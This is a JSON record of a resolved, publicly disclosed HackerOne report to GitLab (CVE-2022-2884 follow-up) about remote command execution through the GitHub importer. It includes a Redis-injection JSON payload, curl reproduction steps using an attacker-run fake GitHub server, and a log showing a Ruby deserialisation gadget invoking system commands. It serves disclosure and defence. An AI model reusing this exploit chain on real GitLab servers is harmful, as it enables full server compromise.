{
  "id": 1679624,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc5NjI0",
  "url": "https://hackerone.com/reports/1679624",
  "title": "Remote Command Execution via Github import",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-08-25T04:07:51.933Z",
  "submitted_at": "2022-08-25T04:07:52.077Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142937Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=99928aea98731415f74488726f93cf61267adb71901e9d7110b0a50fc09f9f8b"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-2884"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-10-06T20:19:24.594Z",
  "bug_reporter_agreed_on_going_public_at": "2022-10-04T08:28:22.936Z",
  "team_member_agreed_on_going_public_at": "2022-10-06T20:19:24.278Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nThis is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository.\n\nWhen importing a GitHub repo the api client uses `Sawyer` for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys:\n\nhttps://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb#L106-L110\n```ruby\n    def self.attr_accessor(*attrs)\n      attrs.each do |attribute|\n        class_eval do\n          define_method attribute do\n            @attrs[attribute.to_sym]\n          end\n\n          define_method \"#{attribute}=\" do |value|\n            @attrs[attribute.to_sym] = value\n          end\n\n          define_method \"#{attribute}?\" do\n            !!@attrs[attribute.to_sym]\n          end\n        end\n      end\n    end\n```\n\nThis happens recursively, and allows for any method to be overridden including built-in methods such as `to_s`.\n\nThe redis gem uses `to_s` and `bytesize` to generate the RESP command, so if a `Sawyer::Resource` is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the `$` size provided (see https://redis.io/docs/reference/protocol-spec/)\n\nhttps://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L20\n```ruby\n            i = i.to_s\n            command << \"$#{i.bytesize}\"\n            command << i\n```\n\nThe patch for CVE-2022-2884 added validation to `Gitlab::Cache::Import::Caching` but there is another spot where the  `Sawyer::Resource` is passed to redis:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/github_import/importer/repository_importer.rb#L55\n```ruby\n       def import_repository\n          project.ensure_repository\n\n          refmap = Gitlab::GithubImport.refmap\n          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)\n\n          project.change_head(default_branch) if default_branch\n\n          # The initial fetch can bring in lots of loose refs and objects.\n          # Running a `git gc` will make importing pull requests faster.\n          Repositories::HousekeepingService.new(project, :gc).execute\n\n          true\n        end\n```\n\nThe `default_branch` param comes from the client repository (which is a nested Sawyer::Resource of attacker controlled data), and is passed to `change_head`  which then calls `branch_exists?`  and `branch_names_include?` which passes the value to redis:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/repository_cache_adapter.rb#L71\n```ruby\n        define_method(\"#{name}_include?\") do |value|\n          ivar = \"@#{name}_include\"\n          memoized = instance_variable_get(ivar) || {}\n          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend\n\n          next memoized[value] if memoized.key?(value)\n\n          memoized[value] =\n            if strong_memoized?(name)\n              lookup.call\n            else\n              result, exists = redis_set_cache.try_include?(name, value)\n\n              exists ? result : lookup.call\n            end\n\n          instance_variable_set(ivar, memoized)[value]\n        end\n```\n\nSo by returning an api response with a `default_branch` that overrides `to_s` and `bytesize` you can call arbitrary redis commands:\n\n```json\n        {\n            \"default_branch\": {\n                \"to_s\": {\n                    \"to_s\": 'ggg\\r\\nINJECT_RESP_HERE',\n                    \"bytesize\": 3,\n                }\n            }\n        }\n```\n\nThis can be combined with a call to `Marshal.load` when loading a _gitlab_session to execute a deserialisation gadget (such as https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and gain RCE.\n\n### Steps to reproduce\n\n1. edit {F1882976} and change the command at `git_set`, that will be the command that is executed\n1. change the `session:gitlab:gggg`  to be something other than `gggg`\n1. run `ruby ./gen_payload3.rb` and copy the payload\n1. edit {F1882972} and update the payload\n1. run `ngrok http 5000` and copy the url\n1. edit `fake_server3.py` and update the ngrok url\n1. run the server with `FLASK_APP=fake_server3.py flask run`\n1. run `curl --request POST --url \"http://gitlab.wbowling.info/api/v4/import/github\"  --header \"content-type: application/json\" --header \"PRIVATE-TOKEN: API_TOKEN\" --data \"{\\\"personal_access_token\\\": \\\"fake_token\\\",\\\"repo_id\\\": \\\"12345\\\",\\\"target_namespace\\\": \\\"root\\\",\\\"new_name\\\": \\\"gh-import-$RANDOM\\\",\\\"github_hostname\\\": \\\"https://9895-45-248-49-157.ngrok.io\\\"}\"` replacing `gitlab.wbowling.info` with your gitlab url, `API_TOKEN` with a valid gitlab token, `target_namespace` with a namespace you have access to, and `github_hostname` with your ngrok url\n1. wait a minute or so, you should see requests coming in to the flask app. Once you see a request for `/api/v3/repos/fake/name` that should be long enough, there will also be an error in `/var/log/gitlab/gitlab-rails/exceptions_json.log` about `comparison of String with 0 failed`\n1. run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen_payload3.rb`\n1. the payload should have executed\n\n### Impact\n\nAllows an attacker with the ability to import a github repo to execute arbitrary commands on the server\n\n### Examples\n\nSee attached scripts and steps to reproduce\n\n### What is the current *bug* behavior?\n\nThe `Sawyer::Resource` object is passed around and allows an attacker to override builtin methods\n\n### What is the expected *correct* behavior?\n\nThe `Sawyer::Resource` has a `to_h` method which could potentially be used to ensure a plain has it passed around.\n\n### Relevant logs and/or screenshots\nredis command ends up as:\n```\n[pid  1362] read(67, \"*1\\r\\n$5\\r\\nmulti\\r\\n*3\\r\\n$9\\r\\nsismember\\r\\n$53\\r\\ncache:gitlab:branch_names:root/gh-import-7316:102:set\\r\\n$3\\r\\nggg\\r\\n*3\\r\\n$3\\r\\nset\\r\\n$19\\r\\nsession:gitlab:jjjj\\r\\n$330\\r\\n\\4\\10[\\10c\\25Gem::SpecFetcherc\\23Gem::InstallerU:\\25Gem::Requirement[\\6o:\\34Gem::Package::TarReader\\6:\\10@ioo:\\24Net::BufferedIO\\7;\\7o:#Gem::Package::TarReader::Entry\\7:\\n@readi\\0:\\f@headerI\\\"\\10aaa\\6:\\6ET:\\22@debug_outputo:\\26Net::WriteAdapter\\7:\\f@socketo:\\24Gem::RequestSet\\7:\\n@setso;\\16\\7;\\17m\\vKernel:\\17@method_id:\\vsystem:\\r@git_setI\\\"\\33echo id > /tmp/vakzz22\\6;\\fT;\\22:\\fresolve\\r\\n*2\\r\\n$6\\r\\nexists\\r\\n$53\\r\\ncache:gitlab:branch_names:root/gh-import-7316:102:set\\r\\n*1\\r\\n$4\\r\\nexec\\r\\n\", 16384) = 570\n```\n\nerror in the logs\n```json\n{\"severity\":\"ERROR\",\"time\":\"2022-08-25T03:57:55.006Z\",\"correlation_id\":\"01GB9JCB7TYNH6F7J7W7NFQTDT\",\"exception.class\":\"ArgumentError\",\"exception.message\":\"comparison of String with 0 failed\",\"exception.backtrace\":[\"lib/gitlab/set_cache.rb:60:in `block in try_include?'\",\"lib/gitlab/redis/wrapper.rb:23:in `block in with'\",\"lib/gitlab/redis/wrapper.rb:23:in `with'\",\"lib/gitlab/set_cache.rb:74:in `with'\",\"lib/gitlab/set_cache.rb:59:in `try_include?'\",\"lib/gitlab/repository_cache_adapter.rb:71:in `block in cache_method_as_redis_set'\",\"app/models/repository.rb:288:in `branch_exists?'\",\"app/models/repository.rb:1161:in `change_head'\",\"app/models/concerns/has_repository.rb:17:in `change_head'\",\"lib/gitlab/github_import/importer/repository_importer.rb:55:in `import_repository'\",\"lib/gitlab/github_import/importer/repository_importer.rb:37:in `execute'\",\"app/workers/gitlab/github_import/stage/import_repository_worker.rb:31:in `import'\",\"app/workers/concerns/gitlab/github_import/stage_methods.rb:37:in `try_import'\",\"app/workers/concerns/gitlab/github_import/stage_methods.rb:20:in `perform'\",\"lib/gitlab/database/load_balancing/sidekiq_server_middleware.rb:26:in `call'\",\"lib/gitlab/sidekiq_middleware/duplicate_jobs/strategies/until_executing.rb:16:in `perform'\",\"lib/gitlab/sidekiq_middleware/duplicate_jobs/duplicate_job.rb:58:in `perform'\",\"lib/gitlab/sidekiq_middleware/duplicate_jobs/server.rb:8:in `call'\",\"lib/gitlab/sidekiq_middleware/worker_context.rb:9:in `wrap_in_optional_context'\",\"lib/gitlab/sidekiq_middleware/worker_context/server.rb:19:in `block in call'\",\"lib/gitlab/application_context.rb:110:in `block in use'\",\"lib/gitlab/application_context.rb:110:in `use'\",\"lib/gitlab/application_context.rb:52:in `with_context'\",\"lib/gitlab/sidekiq_middleware/worker_context/server.rb:17:in `call'\",\"lib/gitlab/sidekiq_status/server_middleware.rb:7:in `call'\",\"lib/gitlab/sidekiq_versioning/middleware.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `block in call'\",\"lib/gitlab/database/query_analyzer.rb:37:in `within'\",\"lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `call'\",\"lib/gitlab/sidekiq_middleware/admin_mode/server.rb:14:in `call'\",\"lib/gitlab/sidekiq_middleware/instrumentation_logger.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/batch_loader.rb:7:in `call'\",\"lib/gitlab/sidekiq_middleware/extra_done_log_metadata.rb:7:in `call'\",\"lib/gitlab/sidekiq_middleware/request_store_middleware.rb:10:in `block in call'\",\"lib/gitlab/with_request_store.rb:17:in `enabling_request_store'\",\"lib/gitlab/with_request_store.rb:10:in `with_request_store'\",\"lib/gitlab/sidekiq_middleware/request_store_middleware.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:76:in `block in call'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `block in instrument'\",\"lib/gitlab/metrics/background_transaction.rb:33:in `run'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `instrument'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:75:in `call'\",\"lib/gitlab/sidekiq_middleware/monitor.rb:10:in `block in call'\",\"lib/gitlab/sidekiq_daemon/monitor.rb:49:in `within_job'\",\"lib/gitlab/sidekiq_middleware/monitor.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/size_limiter/server.rb:13:in `call'\",\"lib/gitlab/sidekiq_logging/structured_logger.rb:21:in `call'\"],\"user.username\":\"root\",\"tags.program\":\"sidekiq\",\"tags.locale\":\"en\",\"tags.feature_category\":\"importers\",\"tags.correlation_id\":\"01GB9JCB7TYNH6F7J7W7NFQTDT\",\"extra.sidekiq\":{\"retry\":5,\"queue\":\"github_importer:github_import_stage_import_repository\",\"version\":0,\"queue_namespace\":\"github_importer\",\"dead\":false,\"memory_killer_memory_growth_kb\":50,\"memory_killer_max_memory_growth_kb\":300000,\"status_expiration\":1800,\"args\":[\"[FILTERED]\"],\"class\":\"Gitlab::GithubImport::Stage::ImportRepositoryWorker\",\"jid\":\"f6fd0ce785d6cc8e91b5b776\",\"created_at\":1661399872.1377518,\"correlation_id\":\"01GB9JCB7TYNH6F7J7W7NFQTDT\",\"meta.caller_id\":\"RepositoryImportWorker\",\"meta.remote_ip\":\"192.168.0.149\",\"meta.feature_category\":\"importers\",\"meta.user\":\"root\",\"meta.project\":\"root/gh-import-7316\",\"meta.root_namespace\":\"root\",\"meta.client_id\":\"user/1\",\"meta.root_caller_id\":\"POST /api/:version/import/github\",\"worker_data_consistency\":\"always\",\"idempotency_key\":\"resque:gitlab:duplicate:github_importer:github_import_stage_import_repository:797f481f035041a27c840a58899f1557fc2a102dfc05bc2cb918651c86da1219\",\"size_limiter\":\"validated\",\"enqueued_at\":1661399872.1395159},\"extra.import_type\":\"github\",\"extra.project_id\":102,\"extra.source\":\"Gitlab::GithubImport::Stage::ImportRepositoryWorker\"}\n```\n\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:\t\tUbuntu 20.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.5p203\nGem Version:\t3.1.6\nBundler Version:2.3.15\nRake Version:\t13.0.6\nRedis Version:\t6.2.7\nSidekiq Version:6.4.0\nGo Version:\tunknown\n\nGitLab information\nVersion:\t15.3.1-ee\nRevision:\t518311979e3\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.10\nURL:\t\thttp://gitlab.wbowling.info\nHTTP Clone URL:\thttp://gitlab.wbowling.info/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.wbowling.info:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t14.10.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n```\n\n## Impact\n\nAllows an attacker with the ability to import a github repo to execute arbitrary commands on the server",
  "bounty_amount": "33510.0",
  "formatted_bounty": "$33,510",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1882972,
      "file_name": "fake_server3.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nlpdm8awpgp8cmmkxydr47ee3gyw?response-content-disposition=attachment%3B%20filename%3D%22fake_server3.py%22%3B%20filename%2A%3DUTF-8%27%27fake_server3.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142937Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=1924d8101758286ff5e637f7ebad1ce72dfd8e25fbed5faf2986e6335a66e20f",
      "file_size": 4797,
      "type": "text/x-python-script",
      "moderated": null
    },
    {
      "id": 1882976,
      "file_name": "gen_payload3.rb",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ah5wqhp3puz33z3exqa8154oeztd?response-content-disposition=attachment%3B%20filename%3D%22gen_payload3.rb%22%3B%20filename%2A%3DUTF-8%27%27gen_payload3.rb&response-content-type=text%2Fx-ruby-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142937Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=dd7ddd1523a393390231cbefec19ec9202cdffe75e71a8394995aca714ff962a",
      "file_size": 1060,
      "type": "text/x-ruby-script",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 284,
  "voters": [
    "doesnotcompute",
    "just4rand0mdud3",
    "jumpydata",
    "thesag",
    "cxzer0",
    "thebeskarmandalorian",
    "shreyaschavhan",
    "bfr4nk",
    "abejads",
    "ph03ni6",
    "and 274 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.9,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
